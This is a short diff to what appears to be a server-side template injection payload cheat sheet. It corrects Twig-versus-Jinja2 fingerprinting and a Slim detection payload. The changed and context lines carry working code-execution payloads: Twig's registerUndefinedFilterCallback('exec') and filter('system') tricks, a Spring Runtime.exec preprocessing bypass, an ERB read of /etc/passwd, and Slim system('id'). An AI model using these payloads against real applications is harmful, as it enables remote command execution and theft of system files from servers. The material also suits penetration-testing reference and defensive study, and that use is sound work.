@@ -76,7 +76,7 @@ Filter bypasses: `|attr()` for `.`/`[]` bans, `\x5f` hex for `_` bans, `[]`+`req
 **Twig**:
 
 ```twig
-{{7*7}} {{7*'7'}}                        → 49 / 7777777 (string-multiply distinguishes from Jinja2)
+{{7*7}} {{7*'7'}}                        → 49 / 49  (Twig coerces '7' to a number; Jinja2 gives 7777777 — Python string-repeat. Use this pair as the Twig-vs-Jinja fingerprint.)
 {{_self}} {{_self.env}}
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
 {{['id']|filter('system')}}
@@ -138,7 +138,7 @@ __${T(java.lang.Runtime).getRuntime().exec('id')}__::.x    // preprocessing bypa
 <%= File.open('/etc/passwd').read %>
 ```
 
-**Slim**: `#{7*7}` detection → `#{'x'`/`#{system('id')}`.
+**Slim**: `#{7*7}` detection → `#{'x'*7}` / `#{system('id')}`.
 
 ## JavaScript engines (Node)
 
